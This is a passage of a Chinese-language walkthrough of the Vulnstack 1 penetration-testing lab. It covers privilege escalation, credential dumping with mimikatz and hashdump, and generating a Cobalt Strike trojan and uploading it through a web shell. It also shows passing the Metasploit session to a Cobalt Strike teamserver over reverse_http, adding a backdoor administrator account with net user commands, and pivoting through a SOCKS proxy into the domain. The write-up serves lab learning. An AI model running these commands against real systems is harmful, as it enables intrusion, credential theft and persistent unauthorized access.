+<p><img src="/shentou/vulnstack/vulnstack1/1720688363711-3608c005-510c-43dd-880f-08ccbf3be637.png"
+	width="879"
+	height="135"
+	srcset="/shentou/vulnstack/vulnstack1/1720688363711-3608c005-510c-43dd-880f-08ccbf3be637_hudb91b84f921b6fb6e0ec024415511b6f_67519_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720688363711-3608c005-510c-43dd-880f-08ccbf3be637_hudb91b84f921b6fb6e0ec024415511b6f_67519_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="651"
+		data-flex-basis="1562px"
+	
+></p>
+<p>连上</p>
+<h4 id="1提权">1.提权
+</h4><p><img src="/shentou/vulnstack/vulnstack1/1720688507671-7021f8f0-67c1-4266-a844-41bd2a24d394.png"
+	width="415"
+	height="70"
+	srcset="/shentou/vulnstack/vulnstack1/1720688507671-7021f8f0-67c1-4266-a844-41bd2a24d394_hu6addccd75d90b84d44d6370ccc90aa89_23082_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720688507671-7021f8f0-67c1-4266-a844-41bd2a24d394_hu6addccd75d90b84d44d6370ccc90aa89_23082_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="592"
+		data-flex-basis="1422px"
+	
+></p>
+<p>由于直接就是administrator,所以可以直接提权到system</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720753064267-de067716-444b-4867-87e7-980900b8332d.png"
+	width="847"
+	height="152"
+	srcset="/shentou/vulnstack/vulnstack1/1720753064267-de067716-444b-4867-87e7-980900b8332d_hu159a504a8788d5b546d53ec21b514556_86449_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720753064267-de067716-444b-4867-87e7-980900b8332d_hu159a504a8788d5b546d53ec21b514556_86449_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="557"
+		data-flex-basis="1337px"
+	
+></p>
+<h4 id="2获取账号密码">2.获取账号密码
+</h4><h5 id="font-stylecolorrgb77-77-771导入账号密码hash值font"><font style="color:rgb(77, 77, 77);">1.导入账号，密码hash值：</font>
+</h5><p>使用<code>windows/gather/smart_hashdump</code>模块</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720753815836-a4565426-c004-4aa8-890a-3e5b941c4ca6.png"
+	width="1058"
+	height="370"
+	srcset="/shentou/vulnstack/vulnstack1/1720753815836-a4565426-c004-4aa8-890a-3e5b941c4ca6_hu9f18a42ecc7f7bbfb0199855a0bf91c4_304337_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720753815836-a4565426-c004-4aa8-890a-3e5b941c4ca6_hu9f18a42ecc7f7bbfb0199855a0bf91c4_304337_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="686px"
+	
+></p>
+<h5 id="2mimikatz">2.mimikatz
+</h5><p>加载mimikatz模块</p>
+<p>要先将进程迁移到x64且权限为system的进程去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ps
+</span></span><span class="line"><span class="cl">migrate pid
+</span></span><span class="line"><span class="cl">load kiwi 加载kiwi
+</span></span><span class="line"><span class="cl">creds_all 列举系统的明文密码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack1/1720770247713-7970fab3-b67e-4a30-952c-42de92195c5f.png"
+	width="1117"
+	height="149"
+	srcset="/shentou/vulnstack/vulnstack1/1720770247713-7970fab3-b67e-4a30-952c-42de92195c5f_hue55c39f7c6f701d0056d3321b1f8bdf5_67379_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720770247713-7970fab3-b67e-4a30-952c-42de92195c5f_hue55c39f7c6f701d0056d3321b1f8bdf5_67379_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="749"
+		data-flex-basis="1799px"
+	
+></p>
+<h3 id="cs上线">cs上线
+</h3><p>cs连上我的云服务器</p>
+<h4 id="cs生成木马">cs生成木马
+</h4><p>开启一个监听器</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721093501063-07150053-b203-4bf1-9002-228dd0c76473.png"
+	width="687"
+	height="685"
+	srcset="/shentou/vulnstack/vulnstack1/1721093501063-07150053-b203-4bf1-9002-228dd0c76473_hu75ba8e4e5ce472e7604e77eed10b1f81_96223_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721093501063-07150053-b203-4bf1-9002-228dd0c76473_hu75ba8e4e5ce472e7604e77eed10b1f81_96223_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="240px"
+	
+></p>
+<p>不知道为什么这里一定要80端口</p>
+<p>cs生成木马</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721032708478-bcad281d-e773-47bc-8175-580fc6a86dfe.png"
+	width="456"
+	height="225"
+	srcset="/shentou/vulnstack/vulnstack1/1721032708478-bcad281d-e773-47bc-8175-580fc6a86dfe_hu97c9a4c106a08955353bafeb471fa06b_60842_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721032708478-bcad281d-e773-47bc-8175-580fc6a86dfe_hu97c9a4c106a08955353bafeb471fa06b_60842_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="486px"
+	
+></p>
+<p>这里用的payload是上面那个</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721032732524-2f1a6354-2ddb-43c8-9f0e-619557a9783d.png"
+	width="606"
+	height="398"
+	srcset="/shentou/vulnstack/vulnstack1/1721032732524-2f1a6354-2ddb-43c8-9f0e-619557a9783d_hu42c4152a5db1448f7d6f60b426c365dd_84861_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721032732524-2f1a6354-2ddb-43c8-9f0e-619557a9783d_hu42c4152a5db1448f7d6f60b426c365dd_84861_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="365px"
+	
+></p>
+<p>生成了木马,通过蚁剑将木马上传到服务器上</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721032829389-6521c43d-7d93-49f1-843a-a3f543e7ab2b.png"
+	width="348"
+	height="228"
+	srcset="/shentou/vulnstack/vulnstack1/1721032829389-6521c43d-7d93-49f1-843a-a3f543e7ab2b_hu7f3879344663ba50b67a5fdaf4952d69_10958_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721032829389-6521c43d-7d93-49f1-843a-a3f543e7ab2b_hu7f3879344663ba50b67a5fdaf4952d69_10958_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="366px"
+	
+></p>
+<p>蚁剑上运行</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721093581133-52fcff78-e0ec-412d-b7be-3cc986b955a6.png"
+	width="1017"
+	height="105"
+	srcset="/shentou/vulnstack/vulnstack1/1721093581133-52fcff78-e0ec-412d-b7be-3cc986b955a6_hud0bd60fbd28626bfca6a009ba216492c_36400_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721093581133-52fcff78-e0ec-412d-b7be-3cc986b955a6_hud0bd60fbd28626bfca6a009ba216492c_36400_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="968"
+		data-flex-basis="2324px"
+	
+></p>
+<p>上线了</p>
+<h3 id="font-stylecolorrgb79-79-79msf-联动-cobaltstrikefont"><font style="color:rgb(79, 79, 79);">msf 联动 cobaltstrike</font>
+</h3><p><font style="color:rgb(77, 77, 77);">msf获取到shell后，可以在提权后派发给cobaltstrike</font></p>
+<p><font style="color:rgb(77, 77, 77);">我这里是将server放到云服务器上</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">bash teamserver 116.205.225.75 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack1/1721003834769-ac049ee4-34e0-4c00-9431-e77c4f368b08.png"
+	width="905"
+	height="492"
+	srcset="/shentou/vulnstack/vulnstack1/1721003834769-ac049ee4-34e0-4c00-9431-e77c4f368b08_hu37a3f1d061b3fddd95e0013c490b3695_45810_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721003834769-ac049ee4-34e0-4c00-9431-e77c4f368b08_hu37a3f1d061b3fddd95e0013c490b3695_45810_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="441px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">首先cobaltstrike创建监听器：</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721094135399-8809146b-924d-4e01-82e3-dd0cd8575535.png"
+	width="679"
+	height="493"
+	srcset="/shentou/vulnstack/vulnstack1/1721094135399-8809146b-924d-4e01-82e3-dd0cd8575535_hufc84460dde5ddabba4dfb081683655df_66442_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721094135399-8809146b-924d-4e01-82e3-dd0cd8575535_hufc84460dde5ddabba4dfb081683655df_66442_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="330px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">msf先要连上服务器</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">exploit<span class="o">(</span>handler<span class="o">)</span> &gt;  use exploit/windows/local/payload_inject 
+</span></span><span class="line"><span class="cl">exploit<span class="o">(</span>payload_inject<span class="o">)</span> &gt;  <span class="nb">set</span> PAYLOAD windows/meterpreter/reverse_http   <span class="c1"># cs监听器中相同</span>
+</span></span><span class="line"><span class="cl">exploit<span class="o">(</span>payload_inject<span class="o">)</span> &gt; <span class="nb">set</span> DisablePayloadHandler <span class="nb">true</span> 				  <span class="c1"># 告诉msf已建立监听，不必新建监听</span>
+</span></span><span class="line"><span class="cl">exploit<span class="o">(</span>payload_inject<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 192.168.229.143 					  <span class="c1"># cs的IP</span>
+</span></span><span class="line"><span class="cl">exploit<span class="o">(</span>payload_inject<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">3333</span> 								  <span class="c1"># cs监听器中监听的端口</span>
+</span></span><span class="line"><span class="cl">exploit<span class="o">(</span>payload_inject<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">1</span>  
+</span></span><span class="line"><span class="cl">exploit<span class="o">(</span>payload_inject<span class="o">)</span> &gt; exploit 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack1/1721094122921-0202c30b-b0c0-40f3-9754-3a70a746f716.png"
+	width="1029"
+	height="121"
+	srcset="/shentou/vulnstack/vulnstack1/1721094122921-0202c30b-b0c0-40f3-9754-3a70a746f716_huc9552c6bb77845d8151edf9aa26d5ed4_53023_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721094122921-0202c30b-b0c0-40f3-9754-3a70a746f716_huc9552c6bb77845d8151edf9aa26d5ed4_53023_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="850"
+		data-flex-basis="2040px"
+	
+></p>
+<h4 id="1cs提权">1.cs提权
+</h4><h4 id="2cs获取账号密码">2.cs获取账号密码
+</h4><p>查看用户hash值</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721094765556-693306a9-b62e-4a2e-b69b-8aed7a3ca09d.png"
+	width="1209"
+	height="602"
+	srcset="/shentou/vulnstack/vulnstack1/1721094765556-693306a9-b62e-4a2e-b69b-8aed7a3ca09d_hu2ea820534104ca50b9408cd8d3fea568_339703_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721094765556-693306a9-b62e-4a2e-b69b-8aed7a3ca09d_hu2ea820534104ca50b9408cd8d3fea568_339703_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="481px"
+	
+></p>
+<p>使用mimikatz</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721095063377-2154d4fd-b0bd-46ea-af07-752d2602cb76.png"
+	width="660"
+	height="438"
+	srcset="/shentou/vulnstack/vulnstack1/1721095063377-2154d4fd-b0bd-46ea-af07-752d2602cb76_hu354e76c300d1d0218d4665a03d672577_131868_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721095063377-2154d4fd-b0bd-46ea-af07-752d2602cb76_hu354e76c300d1d0218d4665a03d672577_131868_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="361px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721095190186-8a0b5691-586b-4c31-84b8-9c687d56a5d9.png"
+	width="558"
+	height="272"
+	srcset="/shentou/vulnstack/vulnstack1/1721095190186-8a0b5691-586b-4c31-84b8-9c687d56a5d9_hu4a432624d55f211f9a2f807917641b73_49788_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721095190186-8a0b5691-586b-4c31-84b8-9c687d56a5d9_hu4a432624d55f211f9a2f807917641b73_49788_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="492px"
+	
+></p>
+<p>破解到账号密码</p>
+<p>可以查看登录凭证</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721095353403-61dba466-2f2d-4448-ae65-207edc854370.png"
+	width="940"
+	height="608"
+	srcset="/shentou/vulnstack/vulnstack1/1721095353403-61dba466-2f2d-4448-ae65-207edc854370_hu95581d6603b164d626576c8b1dcb3fa1_158771_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721095353403-61dba466-2f2d-4448-ae65-207edc854370_hu95581d6603b164d626576c8b1dcb3fa1_158771_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="371px"
+	
+></p>
+<h3 id="留后门">留后门
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell net user									 <span class="c1"># 查看本机用户</span>
+</span></span><span class="line"><span class="cl">shell net user guest /active:yes						 <span class="c1"># 激活guest</span>
+</span></span><span class="line"><span class="cl">shell net user guest Aa123456					 <span class="c1"># 给Guest用户设置密码</span>
+</span></span><span class="line"><span class="cl">shell net localgroup administrators guest /add    <span class="c1"># 将guest加入到管理员中</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack1/1721097861031-33107bfd-5761-44cd-b085-655429b1bead.png"
+	width="625"
+	height="101"
+	srcset="/shentou/vulnstack/vulnstack1/1721097861031-33107bfd-5761-44cd-b085-655429b1bead_hu489ae5a0ff57f581ed5cbad9eee18d15_30517_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721097861031-33107bfd-5761-44cd-b085-655429b1bead_hu489ae5a0ff57f581ed5cbad9eee18d15_30517_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="618"
+		data-flex-basis="1485px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721098196220-77b68328-9dc3-40a4-be91-38d5e2a56914.png"
+	width="807"
+	height="239"
+	srcset="/shentou/vulnstack/vulnstack1/1721098196220-77b68328-9dc3-40a4-be91-38d5e2a56914_hu9041e710322d42786298572c12e2d3c5_65362_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721098196220-77b68328-9dc3-40a4-be91-38d5e2a56914_hu9041e710322d42786298572c12e2d3c5_65362_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="337"
+		data-flex-basis="810px"
+	
+></p>
+<p>guest用户启用不了</p>
+<h3 id="远程连接">远程连接
+</h3><p>windows远程连接需要开启3389端口(远程连接端口)</p>
+<p>msf进入shell<code>netstat -an | find &quot;3389&quot; </code></p>
+<p>或者nmap查看3389端口</p>
+<p><code>nmap -p 3389 ip</code></p>
+<p>通过远程桌面连接</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721097425895-19d58acb-7f37-4d09-854f-125d6c05d34e.png"
+	width="1229"
+	height="480"
+	srcset="/shentou/vulnstack/vulnstack1/1721097425895-19d58acb-7f37-4d09-854f-125d6c05d34e_hu77b79f31cd4aece7d2fdc405517590a0_113849_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721097425895-19d58acb-7f37-4d09-854f-125d6c05d34e_hu77b79f31cd4aece7d2fdc405517590a0_113849_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="614px"
+	
+></p>
+<h2 id="内网渗透">内网渗透
+</h2><h3 id="横向移动">横向移动
+</h3><h4 id="搭建隧道">搭建隧道
+</h4><p><font style="color:rgb(77, 77, 77);">横向渗透前，先将该web服务器配置为代理服务器当作跳板机。</font></p>
+<h5 id="font-stylecolorrgb79-79-79msfproxychainsfont"><font style="color:rgb(79, 79, 79);">msf+proxychains</font>
+</h5><p><font style="color:rgb(77, 77, 77);">可用msf直接搭建sock隧道：<br>
+</font><font style="color:rgb(77, 77, 77);">进入session，自动创建路由：</font></p>
+<p><code>run post/multi/manage/autoroute</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721013086121-48005396-850e-4ddf-b280-674d13757734.png"
+	width="906"
+	height="151"
+	srcset="/shentou/vulnstack/vulnstack1/1721013086121-48005396-850e-4ddf-b280-674d13757734_hu68551fa8c97eda75f702115cf0d848eb_96848_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721013086121-48005396-850e-4ddf-b280-674d13757734_hu68551fa8c97eda75f702115cf0d848eb_96848_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="600"
+		data-flex-basis="1440px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">查看路由：</font><br>
+<code>run autoroute -p</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721013134696-f00349e9-afb2-42d3-bc39-6470ebc081c9.png"
+	width="865"
+	height="243"
+	srcset="/shentou/vulnstack/vulnstack1/1721013134696-f00349e9-afb2-42d3-bc39-6470ebc081c9_hueb9877694e6239428250caa893935620_111150_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721013134696-f00349e9-afb2-42d3-bc39-6470ebc081c9_hueb9877694e6239428250caa893935620_111150_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="355"
+		data-flex-basis="854px"
+	
+></p>
+<p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search autoroute
+</span></span><span class="line"><span class="cl">use <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> session
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">route print  <span class="c1">#打印路由</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(77, 77, 77);">退到上层，使用socks4a进行代理，端口与proxychains里设置一致即可：</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">background
+</span></span><span class="line"><span class="cl">use auxiliary/server/socks_proxy
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack1/1721013385779-ee28a07e-c777-4fbf-81bc-9e484269b37b.png"
+	width="870"
+	height="163"
+	srcset="/shentou/vulnstack/vulnstack1/1721013385779-ee28a07e-c777-4fbf-81bc-9e484269b37b_hu4907336907c764c7bd79c28171addbb3_125565_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721013385779-ee28a07e-c777-4fbf-81bc-9e484269b37b_hu4907336907c764c7bd79c28171addbb3_125565_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="533"
+		data-flex-basis="1280px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721100173230-e5352e25-8974-4402-847e-097f57258d7f.png"
+	width="1115"
+	height="133"
+	srcset="/shentou/vulnstack/vulnstack1/1721100173230-e5352e25-8974-4402-847e-097f57258d7f_hu6c32db8dfa057b8df6dcb6240c6f76e2_73466_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721100173230-e5352e25-8974-4402-847e-097f57258d7f_hu6c32db8dfa057b8df6dcb6240c6f76e2_73466_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="838"
+		data-flex-basis="2012px"
+	
+></p>
+<p>可以选择socks4a或者socks5</p>
+<p><font style="color:rgb(77, 77, 77);">run后 可用jobs查看任务是否执行：</font></p>
+<p><code>jobs</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721013488768-5ccd7799-4a6b-4c19-802f-b081e82501b7.png"
+	width="650"
+	height="262"
+	srcset="/shentou/vulnstack/vulnstack1/1721013488768-5ccd7799-4a6b-4c19-802f-b081e82501b7_huc29c5ecdb2ae4a0f38edbcff7228bd19_103515_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721013488768-5ccd7799-4a6b-4c19-802f-b081e82501b7_huc29c5ecdb2ae4a0f38edbcff7228bd19_103515_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">要将srvhost设置为127.0.0.1
+</span></span><span class="line"><span class="cl">srvport <span class="m">1080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vi /etc/proxychains4.conf										<span class="c1"># 配置proxychains4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">socks4 127.0.0.1 1080											<span class="c1"># 这里的ip需要跟上面的socks4a模块一致 						</span>
+</span></span><span class="line"><span class="cl">proxychains4 curl http://内网ip/						<span class="c1"># 使用proxychains4代理访问被控主机，查看是否能使用						</span>
+</span></span><span class="line"><span class="cl">内网ip 看ipconfig
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack1/1721100283675-231d385b-4e38-4ec1-a5a0-d1cbb3511651.png"
+	width="362"
+	height="200"
+	srcset="/shentou/vulnstack/vulnstack1/1721100283675-231d385b-4e38-4ec1-a5a0-d1cbb3511651_hu46a425d3323adbcacc8edfa7ede17963_34963_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721100283675-231d385b-4e38-4ec1-a5a0-d1cbb3511651_hu46a425d3323adbcacc8edfa7ede17963_34963_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="434px"
+	
+><img src="/shentou/vulnstack/vulnstack1/1721100809938-fed6ae20-ee12-45e4-aa89-3dea016928bb.png"
+	width="905"
+	height="223"
+	srcset="/shentou/vulnstack/vulnstack1/1721100809938-fed6ae20-ee12-45e4-aa89-3dea016928bb_hu226c9a1530b751ddebea461b8cca7d1f_145044_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721100809938-fed6ae20-ee12-45e4-aa89-3dea016928bb_hu226c9a1530b751ddebea461b8cca7d1f_145044_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="405"
+		data-flex-basis="973px"
+	
+></p>
+<h3 id="内网信息收集">内网信息收集
+</h3><p><code>ipconfig/all</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721101529384-c3ff6958-d910-4573-8880-46a9d577872f.png"
+	width="466"
+	height="198"
+	srcset="/shentou/vulnstack/vulnstack1/1721101529384-c3ff6958-d910-4573-8880-46a9d577872f_hu27c40cede0e07a56f2ca3dc4d131c232_37316_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721101529384-c3ff6958-d910-4573-8880-46a9d577872f_hu27c40cede0e07a56f2ca3dc4d131c232_37316_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="564px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">发现DNS服务器为</font><code>god.org</code><font style="color:rgb(77, 77, 77);">，使用</font><code>net view</code><font style="color:rgb(77, 77, 77);">查看域信息，发现三台主机</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721111661971-b0fd25a7-6a4a-4bf0-87b1-441097cd9acc.png"
+	width="839"
+	height="265"
+	srcset="/shentou/vulnstack/vulnstack1/1721111661971-b0fd25a7-6a4a-4bf0-87b1-441097cd9acc_hu18a7cd11588fa71c3f94aa2e7e65fc1f_68973_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721111661971-b0fd25a7-6a4a-4bf0-87b1-441097cd9acc_hu18a7cd11588fa71c3f94aa2e7e65fc1f_68973_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="759px"
+	
+></p>
+<p>能看到两台主机,还有一台应该是本身这台</p>
+<p><code>net view /domain</code><font style="color:rgb(77, 77, 77);">查看主域信息</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721112156826-7f26a157-e291-4e65-af40-6b7abd854d02.png"
+	width="704"
+	height="209"
+	srcset="/shentou/vulnstack/vulnstack1/1721112156826-7f26a157-e291-4e65-af40-6b7abd854d02_hu3a0633ae8f0e93e2013eb485582cb3c6_45324_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721112156826-7f26a157-e291-4e65-af40-6b7abd854d02_hu3a0633ae8f0e93e2013eb485582cb3c6_45324_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="336"
+		data-flex-basis="808px"
+	
+></p>
+<p><code>shell net time /domain</code>查看时间服务器</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721112342706-49f12f7c-6bbf-4364-9fc6-4c5886907e4e.png"
+	width="619"
+	height="177"
+	srcset="/shentou/vulnstack/vulnstack1/1721112342706-49f12f7c-6bbf-4364-9fc6-4c5886907e4e_hucf72065d9935969817b427bf77be4517_49617_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721112342706-49f12f7c-6bbf-4364-9fc6-4c5886907e4e_hucf72065d9935969817b427bf77be4517_49617_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="349"
+		data-flex-basis="839px"
+	
+></p>
